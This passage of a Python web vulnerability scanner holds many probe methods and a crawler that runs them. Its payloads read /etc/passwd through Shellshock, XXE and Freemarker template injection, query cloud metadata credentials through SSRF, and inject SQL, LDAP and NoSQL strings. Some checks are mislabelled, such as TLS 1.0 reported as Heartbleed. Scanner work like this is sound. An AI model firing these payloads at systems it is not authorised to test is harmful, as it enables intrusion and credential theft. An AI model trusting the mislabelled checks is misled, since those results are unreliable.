                self.vulnerabilities.append(["GraphQL Introspection", test_url, "GraphQL introspection enabled"])
                console.print(f"[bold red][VULNERABILITY][/bold red] GraphQL introspection enabled at {test_url}")
        except:
            pass

    def scan_websocket(self, url):
        """Checks for WebSocket security issues."""
        ws_url = url.replace('http', 'ws') + '/ws'
        try:
            import websocket
            ws = websocket.create_connection(ws_url)
            ws.send("' OR 1=1--")
            result = ws.recv()
            if "error" not in result.lower():
                self.vulnerabilities.append(["WebSocket Injection", ws_url, "Possible WebSocket injection"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Possible WebSocket injection at {ws_url}")
            ws.close()
        except:
            pass

    def scan_web_cache_deception(self, url):
        """Checks for web cache deception vulnerabilities."""
        test_url = f"{url}/account.php/nonexistent.css"
        headers = {'Cookie': 'loggedIn=true'}
        
        try:
            response = requests.get(test_url, headers=headers, verify=False, timeout=5)
            if response and "account.php" in response.url and "loggedIn" in response.text:
                self.vulnerabilities.append(["Web Cache Deception", test_url, "Possible web cache deception"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Possible web cache deception at {test_url}")
        except:
            pass

    def scan_dom_based_xss(self, url):
        """Checks for DOM-based XSS vulnerabilities."""
        response = self.request_url(url)
        if response:
            soup = BeautifulSoup(response.text, "html.parser")
            scripts = soup.find_all("script")
            
            for script in scripts:
                if "document.write" in script.text and "location.hash" in script.text:
                    self.vulnerabilities.append(["DOM-based XSS", url, "Possible DOM-based XSS"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Possible DOM-based XSS at {url}")
                    return

    def scan_crlf_injection(self, url):
        """Checks for CRLF injection vulnerabilities."""
        test_url = f"{url}?param=%0d%0aX-Forwarded-For:%20127.0.0.1"
        response = self.request_url(test_url)
        
        if response and "X-Forwarded-For: 127.0.0.1" in response.text:
            self.vulnerabilities.append(["CRLF Injection", test_url, "Possible CRLF injection"])
            console.print(f"[bold red][VULNERABILITY][/bold red] Possible CRLF injection at {test_url}")

    def scan_server_side_template_injection(self, url):
        """Checks for SSTI vulnerabilities."""
        payloads = {
            'Twig': '{{7*7}}',
            'Jinja2': '{{7*7}}',
            'Freemarker': '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
            'Velocity': '#set($exec="") ${exec}'
        }
        
        for engine, payload in payloads.items():
            test_url = f"{url}?input={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response:
                if engine == 'Twig' and '49' in response.text:
                    self.vulnerabilities.append(["SSTI Vulnerability", test_url, f"{engine} template injection"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] {engine} SSTI at {test_url}")
                    return
                elif engine == 'Jinja2' and '49' in response.text:
                    self.vulnerabilities.append(["SSTI Vulnerability", test_url, f"{engine} template injection"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] {engine} SSTI at {test_url}")
                    return
                elif engine == 'Freemarker' and 'uid=' in response.text:
                    self.vulnerabilities.append(["SSTI Vulnerability", test_url, f"{engine} template injection"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] {engine} SSTI at {test_url}")
                    return
                elif engine == 'Velocity' and 'uid=' in response.text:
                    self.vulnerabilities.append(["SSTI Vulnerability", test_url, f"{engine} template injection"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] {engine} SSTI at {test_url}")
                    return

    def scan_race_condition(self, url):
        """Checks for race condition vulnerabilities."""
        if '?' in url and '=' in url:
            import threading
            
            def make_request():
                for _ in range(10):
                    requests.get(url, verify=False, timeout=5)
            
            threads = [threading.Thread(target=make_request) for _ in range(10)]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            
            response = self.request_url(url)
            if response and response.status_code == 429:
                console.print(f"[bold green][INFO][/bold green] Rate limiting detected at {url}")
            else:
                self.vulnerabilities.append(["Possible Race Condition", url, "No rate limiting detected"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Possible race condition at {url} (no rate limiting)")

    def scan_subdomain_takeover(self):
        """Checks for subdomain takeover vulnerabilities."""
        common_subdomains = [
            'www', 'mail', 'ftp', 'blog', 
            'dev', 'test', 'staging', 'api',
            'admin', 'cdn', 'm', 'mobile'
        ]
        
        for sub in common_subdomains:
            test_domain = f"{sub}.{self.domain}"
            try:
                ip = socket.gethostbyname(test_domain)
                if ip in ['127.0.0.1', '0.0.0.0']:
                    self.vulnerabilities.append(["Subdomain Takeover", test_domain, "Possible subdomain takeover"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Possible subdomain takeover at {test_domain}")
            except:
                pass

    def scan_common_files(self, url):
        """Checks for common sensitive files."""
        common_files = [
            '/.git/config', '/.svn/entries', '/.htpasswd',
            '/.DS_Store', '/phpinfo.php', '/info.php',
            '/test.php', '/console', '/actuator',
            '/.well-known/security.txt'
        ]
        
        for file in common_files:
            test_url = f"{url}{file}"
            response = self.request_url(test_url)
            if response and response.status_code == 200:
                self.vulnerabilities.append(["Sensitive File Found", test_url, f"Exposed {file}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Sensitive file found at {test_url}")

    def scan_http_methods_extended(self, url):
        """Checks for extended HTTP methods."""
        methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH', 'PROPFIND']
        
        for method in methods:
            try:
                response = requests.request(method, url, verify=False, timeout=5)
                if response.status_code not in [405, 501]:
                    self.vulnerabilities.append(["Dangerous HTTP Method", url, f"{method} method allowed"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] {method} method allowed at {url}")
            except:
                pass

    def scan_cors_extended(self, url):
        """Extended CORS checks."""
        origins = ['https://evil.com', 'null', 'https://attacker.com']
        
        for origin in origins:
            headers = {'Origin': origin}
            try:
                response = requests.get(url, headers=headers, verify=False, timeout=5)
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == origin and acac == 'true':
                    self.vulnerabilities.append(["CORS Misconfiguration", url, f"Reflects Origin: {origin} with credentials"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Insecure CORS at {url} (reflects {origin} with credentials)")
            except:
                pass

    def scan_ssrf_extended(self, url):
        """Extended SSRF checks."""
        payloads = [
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://localhost:80',
            'http://127.0.0.1:8080',
            'http://[::1]'
        ]
        
        for payload in payloads:
            test_url = f"{url}?url={payload}" if '?' not in url else f"{url}{payload}"
            try:
                response = requests.get(test_url, verify=False, timeout=5)
                if response and ("InstanceProfile" in response.text or "localhost" in response.text):
                    self.vulnerabilities.append(["SSRF Vulnerability", test_url, f"Payload: {payload}"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] SSRF found at {test_url}")
                    return
            except:
                pass

    def scan_xml_injection(self, url):
        """Checks for XML injection vulnerabilities."""
        payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        headers = {'Content-Type': 'application/xml'}
        
        try:
            response = requests.post(url, data=payload, headers=headers, verify=False, timeout=5)
            if response and "root:" in response.text:
                self.vulnerabilities.append(["XML Injection", url, "XXE payload executed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] XML injection at {url}")
        except:
            pass

    def scan_json_injection(self, url):
        """Checks for JSON injection vulnerabilities."""
        payload = '{"username":"admin","password":{"$ne":""}}'
        headers = {'Content-Type': 'application/json'}
        
        try:
            response = requests.post(url, data=payload, headers=headers, verify=False, timeout=5)
            if response and "admin" in response.text:
                self.vulnerabilities.append(["JSON Injection", url, "Possible NoSQL injection"])
                console.print(f"[bold red][VULNERABILITY][/bold red] JSON injection at {url}")
        except:
            pass

    def scan_ldap_injection(self, url):
        """Checks for LDAP injection vulnerabilities."""
        payloads = [
            '*)(objectClass=*))(|(objectClass=*',
            '*)(uid=*))(|(uid=*',
            'admin)(&)'
        ]
        
        for payload in payloads:
            test_url = f"{url}?username={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response and ("ldap" in response.text.lower() or "search filter" in response.text.lower()):
                self.vulnerabilities.append(["LDAP Injection", test_url, f"Payload: {payload}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] LDAP injection at {test_url}")
                return

    def scan_xpath_injection(self, url):
        """Checks for XPath injection vulnerabilities."""
        payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "'] | //user | //*[contains('"
        ]
        
        for payload in payloads:
            test_url = f"{url}?query={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response and ("XPATH" in response.text or "XPathException" in response.text):
                self.vulnerabilities.append(["XPath Injection", test_url, f"Payload: {payload}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] XPath injection at {test_url}")
                return

    def scan_header_injection(self, url):
        """Checks for HTTP header injection vulnerabilities."""
        payload = "test\r\nX-Malicious: header"
        test_url = f"{url}?param={payload}" if '?' not in url else f"{url}{payload}"
        response = self.request_url(test_url)
        
        if response and "X-Malicious: header" in response.text:
            self.vulnerabilities.append(["Header Injection", test_url, "Possible HTTP header injection"])
            console.print(f"[bold red][VULNERABILITY][/bold red] HTTP header injection at {test_url}")

    def scan_email_injection(self, url):
        """Checks for email injection vulnerabilities."""
        payload = "test@example.com\nCc: victim@example.com"
        test_url = f"{url}?email={payload}" if '?' not in url else f"{url}{payload}"
        response = self.request_url(test_url)
        
        if response and "victim@example.com" in response.text:
            self.vulnerabilities.append(["Email Injection", test_url, "Possible email header injection"])
            console.print(f"[bold red][VULNERABILITY][/bold red] Email injection at {test_url}")

    def scan_orm_injection(self, url):
        """Checks for ORM injection vulnerabilities."""
        payloads = [
            "1 OR 1=1",
            "1' OR '1'='1",
            "1) OR (1=1"
        ]
        
        for payload in payloads:
            test_url = f"{url}?id={payload}" if '?' not in url else f"{url}{payload}"
            response = self.request_url(test_url)
            
            if response and ("error" in response.text.lower() or "exception" in response.text.lower()):
                self.vulnerabilities.append(["ORM Injection", test_url, f"Payload: {payload}"])
                console.print(f"[bold red][VULNERABILITY][/bold red] ORM injection at {test_url}")
                return

    def scan_deserialization(self, url):
        """Checks for insecure deserialization vulnerabilities."""
        payload = 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADmphdmEubGFuZy5Mb25nO4vkkMyPI98CAAFKAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cHcIAAAAED9JQUE='
        
        try:
            response = requests.post(url, data=payload, headers={'Content-Type': 'application/x-java-serialized-object'}, verify=False, timeout=5)
            if response and "java" in response.text.lower():
                self.vulnerabilities.append(["Insecure Deserialization", url, "Java deserialization detected"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Insecure deserialization at {url}")
        except:
            pass

    def scan_oauth_flaws(self, url):
        """Checks for OAuth implementation flaws."""
        test_url = f"{url}?redirect_uri=https://evil.com"
        response = self.request_url(test_url)
        
        if response and "evil.com" in response.text:
            self.vulnerabilities.append(["OAuth Flaw", test_url, "Open redirect in OAuth flow"])
            console.print(f"[bold red][VULNERABILITY][/bold red] OAuth open redirect at {test_url}")

    def scan_jwt_flaws(self, url):
        """Checks for JWT implementation flaws."""
        response = self.request_url(url)
        if response:
            cookies = response.cookies
            for cookie in cookies:
                if len(cookie.value) > 100 and "." in cookie.value:  # Possible JWT
                    parts = cookie.value.split(".")
                    if len(parts) == 3:
                        # Check for weak secret
                        try:
                            import jwt
                            decoded = jwt.decode(cookie.value, options={"verify_signature": False})
                            if "alg" in decoded and decoded["alg"].lower() == "none":
                                self.vulnerabilities.append(["JWT Implementation Issue", url, "None algorithm accepted"])
                                console.print(f"[bold red][VULNERABILITY][/bold red] JWT 'none' algorithm accepted at {url}")
                        except:
                            pass

    def scan_saml_flaws(self, url):
        """Checks for SAML implementation flaws."""
        test_url = f"{url}/saml"
        response = self.request_url(test_url)
        
        if response and "saml" in response.text.lower():
            self.vulnerabilities.append(["SAML Endpoint Found", test_url, "SAML endpoint detected"])
            console.print(f"[bold yellow][WARNING][/bold yellow] SAML endpoint found at {test_url}")

    def scan_open_buckets(self):
        """Checks for open cloud storage buckets."""
        cloud_providers = {
            'AWS S3': f"http://{self.domain}.s3.amazonaws.com",
            'Google Cloud Storage': f"http://storage.googleapis.com/{self.domain}",
            'Azure Blob Storage': f"http://{self.domain}.blob.core.windows.net"
        }
        
        for provider, test_url in cloud_providers.items():
            try:
                response = requests.get(test_url, verify=False, timeout=5)
                if response.status_code == 200:
                    self.vulnerabilities.append(["Open Cloud Bucket", test_url, f"Open {provider} bucket"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Open {provider} bucket at {test_url}")
            except:
                pass

    def scan_elasticsearch(self):
        """Checks for exposed Elasticsearch instances."""
        test_url = f"{self.target_url}:9200/_cat"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200:
                self.vulnerabilities.append(["Exposed Elasticsearch", test_url, "Elasticsearch instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Elasticsearch at {test_url}")
        except:
            pass

    def scan_mongodb(self):
        """Checks for exposed MongoDB instances."""
        test_url = f"{self.target_url}:27017/"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if "MongoDB" in response.text:
                self.vulnerabilities.append(["Exposed MongoDB", test_url, "MongoDB instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed MongoDB at {test_url}")
        except:
            pass

    def scan_redis(self):
        """Checks for exposed Redis instances."""
        test_url = f"{self.target_url}:6379"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((urlparse(self.target_url).netloc, 6379))
            s.send(b"INFO\r\n")
            data = s.recv(1024)
            if b"redis_version" in data:
                self.vulnerabilities.append(["Exposed Redis", test_url, "Redis instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Redis at {test_url}")
            s.close()
        except:
            pass

    def scan_memcached(self):
        """Checks for exposed Memcached instances."""
        test_url = f"{self.target_url}:11211"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((urlparse(self.target_url).netloc, 11211))
            s.send(b"stats\r\n")
            data = s.recv(1024)
            if b"STAT" in data:
                self.vulnerabilities.append(["Exposed Memcached", test_url, "Memcached instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Memcached at {test_url}")
            s.close()
        except:
            pass

    def scan_docker(self):
        """Checks for exposed Docker APIs."""
        test_url = f"{self.target_url}:2375/version"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "ApiVersion" in response.text:
                self.vulnerabilities.append(["Exposed Docker API", test_url, "Docker API exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Docker API at {test_url}")
        except:
            pass

    def scan_kubernetes(self):
        """Checks for exposed Kubernetes APIs."""
        test_url = f"{self.target_url}:6443/api"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "versions" in response.text:
                self.vulnerabilities.append(["Exposed Kubernetes API", test_url, "Kubernetes API exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Kubernetes API at {test_url}")
        except:
            pass

    def scan_jenkins(self):
        """Checks for exposed Jenkins instances."""
        test_url = f"{self.target_url}:8080"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "Jenkins" in response.text:
                self.vulnerabilities.append(["Exposed Jenkins", test_url, "Jenkins instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Jenkins at {test_url}")
        except:
            pass

    def scan_grafana(self):
        """Checks for exposed Grafana instances."""
        test_url = f"{self.target_url}:3000"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "Grafana" in response.text:
                self.vulnerabilities.append(["Exposed Grafana", test_url, "Grafana instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Grafana at {test_url}")
        except:
            pass

    def scan_prometheus(self):
        """Checks for exposed Prometheus instances."""
        test_url = f"{self.target_url}:9090"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "Prometheus" in response.text:
                self.vulnerabilities.append(["Exposed Prometheus", test_url, "Prometheus instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Prometheus at {test_url}")
        except:
            pass

    def scan_rabbitmq(self):
        """Checks for exposed RabbitMQ instances."""
        test_url = f"{self.target_url}:15672"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "RabbitMQ" in response.text:
                self.vulnerabilities.append(["Exposed RabbitMQ", test_url, "RabbitMQ management interface exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed RabbitMQ at {test_url}")
        except:
            pass

    def scan_kibana(self):
        """Checks for exposed Kibana instances."""
        test_url = f"{self.target_url}:5601"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "Kibana" in response.text:
                self.vulnerabilities.append(["Exposed Kibana", test_url, "Kibana instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Kibana at {test_url}")
        except:
            pass

    def scan_consul(self):
        """Checks for exposed Consul instances."""
        test_url = f"{self.target_url}:8500"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "Consul" in response.text:
                self.vulnerabilities.append(["Exposed Consul", test_url, "Consul instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Consul at {test_url}")
        except:
            pass

    def scan_vault(self):
        """Checks for exposed Vault instances."""
        test_url = f"{self.target_url}:8200"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "Vault" in response.text:
                self.vulnerabilities.append(["Exposed Vault", test_url, "Vault instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Vault at {test_url}")
        except:
            pass

    def scan_etcd(self):
        """Checks for exposed etcd instances."""
        test_url = f"{self.target_url}:2379/version"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "etcdserver" in response.text:
                self.vulnerabilities.append(["Exposed etcd", test_url, "etcd instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed etcd at {test_url}")
        except:
            pass

    def scan_swagger(self):
        """Checks for exposed Swagger/OpenAPI documentation."""
        test_url = f"{self.target_url}/swagger-ui.html"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "Swagger UI" in response.text:
                self.vulnerabilities.append(["Exposed Swagger UI", test_url, "Swagger documentation exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed Swagger UI at {test_url}")
        except:
            pass

    def scan_phpmyadmin(self):
        """Checks for exposed phpMyAdmin instances."""
        test_url = f"{self.target_url}/phpmyadmin"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "phpMyAdmin" in response.text:
                self.vulnerabilities.append(["Exposed phpMyAdmin", test_url, "phpMyAdmin instance exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed phpMyAdmin at {test_url}")
        except:
            pass

    def scan_wordpress_files(self):
        """Checks for exposed WordPress files."""
        test_url = f"{self.target_url}/wp-config.php"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "DB_NAME" in response.text:
                self.vulnerabilities.append(["Exposed wp-config.php", test_url, "WordPress config file exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed wp-config.php at {test_url}")
        except:
            pass

    def scan_joomla_files(self):
        """Checks for exposed Joomla files."""
        test_url = f"{self.target_url}/configuration.php"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "JConfig" in response.text:
                self.vulnerabilities.append(["Exposed configuration.php", test_url, "Joomla config file exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed configuration.php at {test_url}")
        except:
            pass

    def scan_drupal_files(self):
        """Checks for exposed Drupal files."""
        test_url = f"{self.target_url}/sites/default/settings.php"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "database" in response.text:
                self.vulnerabilities.append(["Exposed settings.php", test_url, "Drupal config file exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Exposed settings.php at {test_url}")
        except:
            pass

    def scan_backup_files_extended(self):
        """Extended backup files check."""
        backup_files = [
            'backup.zip', 'backup.tar', 'backup.sql',
            'dump.sql', 'database.sql', 'backup.rar',
            'backup.tar.gz', 'backup.tgz', 'backup.bak',
            'www.zip', 'site.tar.gz', 'archive.zip'
        ]
        
        for file in backup_files:
            test_url = f"{self.target_url}/{file}"
            try:
                response = requests.get(test_url, verify=False, timeout=5)
                if response.status_code == 200 and len(response.content) > 0:
                    self.vulnerabilities.append(["Backup File Found", test_url, f"Backup file: {file}"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Backup file found at {test_url}")
            except:
                pass

    def scan_log_files_extended(self):
        """Extended log files check."""
        log_files = [
            'access.log', 'error.log', 'debug.log',
            'auth.log', 'server.log', 'application.log',
            'apache.log', 'nginx.log', 'mysql.log',
            'php_errors.log', 'security.log', 'system.log'
        ]
        
        for log in log_files:
            test_url = f"{self.target_url}/{log}"
            try:
                response = requests.get(test_url, verify=False, timeout=5)
                if response.status_code == 200 and ("GET /" in response.text or "POST /" in response.text):
                    self.vulnerabilities.append(["Log File Found", test_url, f"Log file: {log}"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Log file found at {test_url}")
            except:
                pass

    def scan_common_misconfigurations(self):
        """Checks for common misconfigurations."""
        # Check for PHP info
        test_url = f"{self.target_url}/phpinfo.php"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "PHP Version" in response.text:
                self.vulnerabilities.append(["PHP Info Exposure", test_url, "phpinfo.php exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] phpinfo.php exposed at {test_url}")
        except:
            pass
        
        # Check for exposed .git directory
        test_url = f"{self.target_url}/.git/config"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "[core]" in response.text:
                self.vulnerabilities.append([".git Exposure", test_url, ".git directory exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] .git directory exposed at {test_url}")
        except:
            pass
        
        # Check for exposed .env file
        test_url = f"{self.target_url}/.env"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "DB_" in response.text:
                self.vulnerabilities.append([".env Exposure", test_url, ".env file exposed"])
                console.print(f"[bold red][VULNERABILITY][/bold red] .env file exposed at {test_url}")
        except:
            pass

    def scan_common_vulnerabilities(self):
        """Checks for common vulnerabilities."""
        # Check for Heartbleed
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    if ssock.version() == "TLSv1":
                        self.vulnerabilities.append(["Heartbleed Vulnerability", self.domain, "TLS 1.0 enabled"])
                        console.print(f"[bold red][VULNERABILITY][/bold red] TLS 1.0 enabled (Heartbleed risk) at {self.domain}")
        except:
            pass
        
        # Check for Shellshock
        test_url = f"{self.target_url}/cgi-bin/test.cgi"
        headers = {'User-Agent': '() { :; }; echo; echo; /bin/cat /etc/passwd'}
        try:
            response = requests.get(test_url, headers=headers, verify=False, timeout=5)
            if response.status_code == 200 and "root:" in response.text:
                self.vulnerabilities.append(["Shellshock Vulnerability", test_url, "Shellshock vulnerability detected"])
                console.print(f"[bold red][VULNERABILITY][/bold red] Shellshock vulnerability at {test_url}")
        except:
            pass
        
        # Check for Struts2
        test_url = f"{self.target_url}/struts2-showcase/"
        try:
            response = requests.get(test_url, verify=False, timeout=5)
            if response.status_code == 200 and "Struts 2" in response.text:
                self.vulnerabilities.append(["Apache Struts2", test_url, "Struts2 framework detected"])
                console.print(f"[bold yellow][WARNING][/bold yellow] Struts2 framework detected at {test_url}")
        except:
            pass

    def scan_network_vulnerabilities(self):
        """Checks for network-level vulnerabilities."""
        # Check for DNS cache poisoning
        try:
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(self.domain, 'A')
            for answer in answers:
                if str(answer) == "127.0.0.1":
                    self.vulnerabilities.append(["DNS Cache Poisoning", self.domain, "Possible DNS cache poisoning"])
                    console.print(f"[bold red][VULNERABILITY][/bold red] Possible DNS cache poisoning for {self.domain}")
        except:
            pass
        
        # Check for email spoofing
        try:
            answers = dns.resolver.resolve(self.domain, 'MX')
            spf_record = False
            try:
                dns.resolver.resolve(self.domain, 'TXT')
                spf_record = True
            except:
                pass
            
            if not spf_record:
                self.vulnerabilities.append(["Email Spoofing", self.domain, "No SPF record found"])
                console.print(f"[bold red][VULNERABILITY][/bold red] No SPF record found for {self.domain}")
        except:
            pass

    def crawl(self, url, progress):
        """Crawls the website and finds links."""
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)

        response = self.request_url(url)
        if response:
            soup = BeautifulSoup(response.text, "html.parser")
            for link in soup.find_all("a", href=True):
                absolute_url = urljoin(self.target_url, link["href"])
                if self.base_url in absolute_url and absolute_url not in self.visited_urls:
                    # Removed undefined progress_task update
                    
                    # Run all vulnerability scans for each URL
                    self.scan_sql_injection(absolute_url)
                    self.scan_xss(absolute_url)
                    self.scan_security_headers(absolute_url)
                    self.scan_directory_listing(absolute_url)
                    self.scan_http_methods(absolute_url)
                    self.scan_sensitive_data_exposure(absolute_url)
                    self.scan_broken_authentication(absolute_url)
                    self.scan_csrf(absolute_url)
                    self.scan_file_inclusion(absolute_url)
                    self.scan_command_injection(absolute_url)
                    self.scan_ssrf(absolute_url)
                    self.scan_xml_external_entity(absolute_url)
                    self.scan_insecure_deserialization(absolute_url)
                    self.scan_server_info_disclosure(absolute_url)
                    self.scan_cors_misconfiguration(absolute_url)
                    self.scan_jwt_issues(absolute_url)
                    self.scan_cache_control(absolute_url)
                    self.scan_cookie_security(absolute_url)
                    self.scan_clickjacking(absolute_url)
                    self.scan_open_redirect(absolute_url)
                    self.scan_host_header_injection(absolute_url)
                    self.scan_http_parameter_pollution(absolute_url)
                    self.scan_content_spoofing(absolute_url)
                    self.scan_webdav(absolute_url)
                    self.scan_robots_txt(absolute_url)
                    self.scan_sitemap_xml(absolute_url)
                    self.scan_backup_files(absolute_url)
                    self.scan_config_files(absolute_url)
                    self.scan_log_files(absolute_url)
                    self.scan_admin_interfaces(absolute_url)
                    self.scan_cms_specific(absolute_url)
                    self.scan_api_endpoints(absolute_url)
                    self.scan_webshells(absolute_url)
                    self.scan_http_request_smuggling(absolute_url)
                    self.scan_prototype_pollution(absolute_url)
                    self.scan_graphql(absolute_url)
                    self.scan_websocket(absolute_url)
                    self.scan_web_cache_deception(absolute_url)
                    self.scan_dom_based_xss(absolute_url)
                    self.scan_crlf_injection(absolute_url)
                    self.scan_server_side_template_injection(absolute_url)
                    self.scan_race_condition(absolute_url)
                    self.scan_common_files(absolute_url)
                    self.scan_http_methods_extended(absolute_url)
                    self.scan_cors_extended(absolute_url)
                    self.scan_ssrf_extended(absolute_url)
                    self.scan_xml_injection(absolute_url)
                    self.scan_json_injection(absolute_url)
                    self.scan_ldap_injection(absolute_url)
                    self.scan_xpath_injection(absolute_url)
                    self.scan_header_injection(absolute_url)
                    self.scan_email_injection(absolute_url)
                    self.scan_orm_injection(absolute_url)
                    self.scan_deserialization(absolute_url)
                    self.scan_oauth_flaws(absolute_url)
                    self.scan_jwt_flaws(absolute_url)
                    self.scan_saml_flaws(absolute_url)
                    
                    self.crawl(absolute_url, progress)

    def display_results(self):
        """Displays vulnerabilities in a table format using Rich."""
        if self.vulnerabilities:
            table = Table(title="Web Security Scan Results", header_style="bold blue")
            table.add_column("Vulnerability Type", style="bold red")
            table.add_column("Affected URL", style="bold yellow")
            table.add_column("Details", style="bold green")

            for vuln in self.vulnerabilities:
                table.add_row(vuln[0], vuln[1], vuln[2])

            console.print(table)
            
            # Summary
            console.print(f"\n[bold cyan]Scan Summary:[/bold cyan]")
            console.print(f"[bold red]{len(self.vulnerabilities)} vulnerabilities found[/bold red]")
            
            # Count by severity
            critical = sum(1 for v in self.vulnerabilities if "SQL Injection" in v[0] or "Command Injection" in v[0] or "RCE" in v[0])
            high = sum(1 for v in self.vulnerabilities if "XSS" in v[0] or "XXE" in v[0] or "SSRF" in v[0])
            medium = sum(1 for v in self.vulnerabilities if "CSRF" in v[0] or "Open Redirect" in v[0] or "Clickjacking" in v[0])
            low = sum(1 for v in self.vulnerabilities if "Information Disclosure" in v[0] or "Missing Header" in v[0])
            
            console.print(f"[bold red]Critical: {critical}[/bold red]")
            console.print(f"[bold yellow]High: {high}[/bold yellow]")
            console.print(f"[bold green]Medium: {medium}[/bold green]")
            console.print(f"[bold blue]Low: {low}[/bold blue]")
        else:
            console.print("[bold green][+] No vulnerabilities found.[/bold green]")

    def run(self):
        """Starts the web security scan with professional progress tracking using Rich's track."""
        from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, track

        self.show_banner()
        console.print(f"[bold cyan]\n[+] Starting Web Security Scan on {self.target_url}...[/bold cyan]")

        # Detect technologies first
        self.detect_technologies()
        if self.technologies:
            console.print("[bold green][+] Detected Technologies:[/bold green]")
            for tech in self.technologies[:5]:
                console.print(f"  - {tech}")

        # Define scan groups as lists of tuples (scan function, description)
        infrastructure_scans = [
            (lambda: self.scan_dns_security(), "Scanning DNS security..."),
            (lambda: self.scan_ssl_tls(), "Checking SSL/TLS..."),
            (lambda: self.scan_subdomain_takeover(), "Checking subdomain takeover..."),
            (lambda: self.scan_open_buckets(), "Checking for open buckets...")
        ]

